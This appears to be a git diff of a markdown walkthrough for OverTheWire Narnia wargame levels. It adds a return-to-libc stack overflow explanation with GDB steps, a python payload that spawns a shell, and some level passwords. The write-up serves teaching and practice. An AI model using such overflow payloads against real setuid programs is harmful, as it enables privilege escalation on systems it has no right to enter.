@@ -51,7 +51,7 @@ efeidiedae
 ```
 
 ### Narnia1
-At first, I thought this one would be easier than the previous challenge. As you can see from the code below, the program attempts to execute code located at the EGG environment variable. Environment Variables are globally accessable variablesfor sharing information between different applications and processes (they can be viewed by entering the `env` command). Since this program runs as Narnia2 (it has a higher privelege as in the last challenge), we want to get the program to open a shell so we can view the Narnia2 password.
+At first, I thought this one would be easier than the previous challenge. As you can see from the code below, the program attempts to execute code located at the EGG environment variable. Environment Variables are globally accessable variablesfor sharing information between different applications and processes (they can be viewed by entering the `env` command). Since this program runs as Narnia2 (it has a higher privilege as in the last challenge), we want to get the program to open a shell so we can view the Narnia2 password.
 
 ```
 int main(){
@@ -132,7 +132,24 @@ nairiepecu
 I hope this helped to explain some basic computer exploitation principles in regards to environment variables. As for shellcode, I'll do some reading up on that and provide some better explanations in the future.
 
 ### Narnia2
-First off, I would like to thank [http://github.com/cphamlet Connor Hamlet]
+First off, I would like to thank [Connor Hamlet](htp://github.com/cphamlet) for his help in crafting this exploit.
+
+Taking a look at the code, we can see that the program is vulnerable to a stack buffer overflow (i.e. we can fill up the buffer to overwrite information on the stack).
+```
+int main(int argc, char * argv[]){
+    char buf[128];
+
+    if(argc == 1){
+        printf("Usage: %s argument\n", argv[0]);
+        exit(1);
+    }
+    strcpy(buf,argv[1]);
+    printf("%s", buf);
+
+    return 0;
+}
+```
+Since I really did a return-to-libc exploit as part of my Masters, I decided to go with that approach. So after testing how to overwrite the instruction pointer (EIP), we found 132 was the amount of byes we needed to fill to get where we needed. After loading up the program in **GDB**, we found the address of the system command by using `print system` (it was 0xf7e4c850). Next we used the find command to locate the string `/bin/sh` in libc by entering `find &system, +999999, "/bin/sh"`. The only pattern found was at 0xf7f6ecc8. We used this information to craft the exploit below. __Note: We use the address 0xf7e11010 as useless information to overflow the return address and get to function input where we put "/bin/sh"__
 
 ```
 narnia2@narnia:~$ /narnia/narnia2 $(python -c 'print "A"*132+"\x50\xc8\xe4\xf7\x10\x10\xe1\xf7\xc8\xec\xf6\xf7"')
@@ -141,3 +158,7 @@ narnia3
 $ cat /etc/narnia_pass/narnia3
 vaequeezee
 ```
+For more information on return-to-libc, check out this [this article](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf) from exploit-db.
+
+### Narnia3
+TBD
